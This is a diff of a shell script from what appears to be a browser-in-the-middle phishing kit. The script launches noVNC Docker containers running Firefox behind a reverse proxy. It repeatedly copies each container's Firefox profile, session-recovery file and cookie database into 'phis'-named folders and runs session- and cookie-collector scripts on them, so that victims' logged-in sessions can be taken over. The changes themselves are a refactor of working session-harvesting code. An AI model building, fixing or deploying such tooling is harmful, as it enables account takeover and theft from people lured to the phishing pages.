@@ -169,11 +169,10 @@ copy_profile() {
     sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -f /home/headless/cookies.sqlite"
     sleep 2
     if [ -n "$OFormat" ]; then
-        python3 ./scripts/session-collector.py ./user$x-recovery.jsonlz4 simple
-        python3 ./scripts/cookies-collector.py ./user$x-cookies.sqlite simple
-        python3 ./scripts/session-collector.py ./muser$x-recovery.jsonlz4 simple
-        python3 ./scripts/cookies-collector.py ./muser$x-cookies.sqlite simple
+        FormatArg=simple
     else
+        FormatArg=default
+
         sudo docker exec vnc-user$x sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
         sudo docker cp vnc-user$x:/home/headless/ffprofile ./phis$x-ffprofile
         sudo docker exec vnc-user$x sh -c "rm -rf /home/headless/ffprofile"
@@ -184,27 +183,31 @@ copy_profile() {
         sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -rf /home/headless/ffprofile"
         sudo chown -R 1000 ./mphis$x-ffprofile
 
-        if [ "$rzip" = true ]; then
+        if [ "$rzip" = "true" ]; then
             zip -r phis$x-ffprofile.zip phis$x-ffprofile/ &> /dev/null
             rm -r phis$x-ffprofile/
 
             zip -r mphis$x-ffprofile.zip mphis$x-ffprofile/ &> /dev/null
             rm -r mphis$x-ffprofile/
         fi
-        python3 ./scripts/session-collector.py ./user$x-recovery.jsonlz4 default
-        python3 ./scripts/cookies-collector.py ./user$x-cookies.sqlite default
-        python3 ./scripts/session-collector.py ./muser$x-recovery.jsonlz4 default
-        python3 ./scripts/cookies-collector.py ./muser$x-cookies.sqlite default
     fi
 
+    popd &> /dev/null
 
-    rm -f output/user$x-recovery.jsonlz4 \
-          output/user$x-cookies.sqlite output/user$x-cookies.sqlite* \
-          output/muser$x-recovery.jsonlz4 output/muser$x-cookies.sqlite output/muser$x-cookies.sqlite*
+    python3 ./scripts/session-collector.py ./user$x-recovery.jsonlz4 $FormatArg
+    python3 ./scripts/cookies-collector.py ./user$x-cookies.sqlite $FormatArg
+    python3 ./scripts/session-collector.py ./muser$x-recovery.jsonlz4 $FormatArg
+    python3 ./scripts/cookies-collector.py ./muser$x-cookies.sqlite $FormatArg
 
-    python3 ./scripts/status.py $x "${urls[$(($x - 1))]}"
+    pushd ./output &> /dev/null
+
+    rm -f user$x-recovery.jsonlz4 \
+          user$x-cookies.sqlite user$x-cookies.sqlite* \
+          muser$x-recovery.jsonlz4 muser$x-cookies.sqlite muser$x-cookies.sqlite*
 
     popd &> /dev/null
+
+    python3 ./scripts/status.py $x "${urls[$(($x - 1))]}"
 }
 
 case "$1" in 
@@ -226,7 +229,7 @@ case "$1" in
     if [ -z "$rzip" ]; then
         rzip=true
     fi
-    
+
     if [ -n "$SSL" ]; then
         if [ -z "$cert" ] || [ -z "$key" ]; then
             echo "Some or all of the parameters are empty";
@@ -311,7 +314,7 @@ case "$1" in
             VNC_CONT=vnc-user$c;
         fi
 
-        echo -e "${BLUE}———— ${VNC_CONT} - ${VNC_IMG} [$c/$END] ————${NC}";
+        echo -e "${BLUE}———— ${VNC_CONT} (from image ${VNC_IMG}) [$c/$END] ————${NC}";
 
         PW=$(openssl rand -hex 14)
         AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
@@ -448,7 +451,7 @@ case "$1" in
         fi     
 
         echo -e "${YELLOW}[~] Starting browser...${NC}"
-        sudo docker exec $VNC_CONT sh -c $FIREFOX_SPAWN_CMD &> /dev/null    
+        sudo docker exec $VNC_CONT sh -c "$FIREFOX_SPAWN_CMD" &> /dev/null    
         echo -e "${GREEN}[+] Browser started${NC}"
 
         CIP=$(sudo docker container inspect $VNC_CONT | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
@@ -656,7 +659,7 @@ case "$1" in
     
     rm -f ./temp.txt ./temp2.txt
 
-    echo -e "————————————————————————————————————————————————"
+    echo -e "${BLUE}————————————————————————————————————————————————${NC}"
     echo -e "${GREEN}[+] All VNC containers started${NC}"
     echo -e "${YELLOW}[~] Starting reverse proxy${NC}"  
 
@@ -727,10 +730,10 @@ case "$1" in
 
     sleep $PROFILE_COPY_INTERVAL
 
-    > copy-log.txt
+    > logs/copy_profile.log
     while :; do
         for (( c=$START; c<=$END; c++ )); do
-            copy_profile $c $urls >> copy-log.txt 2>&1
+            copy_profile $c $urls >> logs/copy_profile.log 2>&1
         done
 
         sleep $PROFILE_COPY_INTERVAL
